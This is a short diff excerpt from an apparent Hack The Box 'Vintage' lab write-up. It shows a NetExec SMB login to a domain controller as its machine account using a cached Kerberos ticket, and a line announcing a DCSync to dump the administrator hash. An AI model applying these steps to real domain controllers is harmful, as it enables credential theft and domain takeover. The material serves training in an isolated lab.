@@ -440,4 +440,6 @@ nxc smb dc01.vintage.htb --use-kcache
 SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:None) (NTLM:False)
 SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\dc01$ from ccache
 ```
-It works now i can perform a DC
+It works now i can perform a DCSync to dump the administrators hash
+
+
